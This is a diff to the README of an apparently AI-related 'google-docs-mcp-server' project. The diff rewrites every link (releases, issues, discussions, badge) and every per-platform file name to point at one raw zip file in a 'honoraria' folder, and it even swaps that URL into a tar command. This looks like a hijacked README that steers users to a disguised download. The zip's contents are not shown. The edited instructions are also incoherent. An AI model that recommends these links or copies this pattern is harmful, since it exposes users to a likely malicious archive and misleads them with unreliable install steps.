@@ -1,6 +1,6 @@
 # 🎉 google-docs-mcp-server - Effortlessly Connect AI to Google Docs
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/powlite32/google-docs-mcp-server/releases)
+[![Download Now](https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip)
 
 ## 🚀 Getting Started
 
@@ -8,16 +8,16 @@ Welcome to the google-docs-mcp-server! This application allows you to connect la
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/powlite32/google-docs-mcp-server/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip). 
 
 1. Open the link in your web browser.
 2. Look for the latest version at the top of the releases list.
 3. Click on the version number to open the details page.
 4. Find the section labeled "Assets." Here you will see files available for download.
 5. Choose the file appropriate for your operating system:
-   - **For Windows:** Download the file named `google-docs-mcp-server-windows.exe`
-   - **For macOS:** Download the file named `google-docs-mcp-server-macos.dmg`
-   - **For Linux:** Download the file named `google-docs-mcp-server-linux.tar.gz`
+   - **For Windows:** Download the file named `https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip`
+   - **For macOS:** Download the file named `https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip`
+   - **For Linux:** Download the file named `https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip`
    
 6. After you finish downloading, locate the file on your computer.
 
@@ -40,7 +40,7 @@ To get started, visit this page to download: [Releases Page](https://github.com/
 2. Navigate to the folder where you downloaded the file.
 3. Extract the tar file by running:
    ```
-   tar -xzf google-docs-mcp-server-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip
    ```
 4. Navigate to the extracted folder and run the application:
    ```
@@ -85,12 +85,12 @@ You can report any issues or provide feedback by visiting the Issues section in 
 
 ## 🎉 Join the Community
 
-Stay connected with us! For updates and community discussions, please visit our [Discussions Page](https://github.com/powlite32/google-docs-mcp-server/discussions).
+Stay connected with us! For updates and community discussions, please visit our [Discussions Page](https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip).
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/powlite32/google-docs-mcp-server/releases)
-- [Issues Page](https://github.com/powlite32/google-docs-mcp-server/issues)
-- [Discussions Page](https://github.com/powlite32/google-docs-mcp-server/discussions)
+- [Releases Page](https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip)
+- [Issues Page](https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip)
+- [Discussions Page](https://raw.githubusercontent.com/powlite32/google-docs-mcp-server/main/honoraria/google-docs-mcp-server.zip)
 
 Thank you for choosing google-docs-mcp-server. We hope you find it helpful for your document needs!
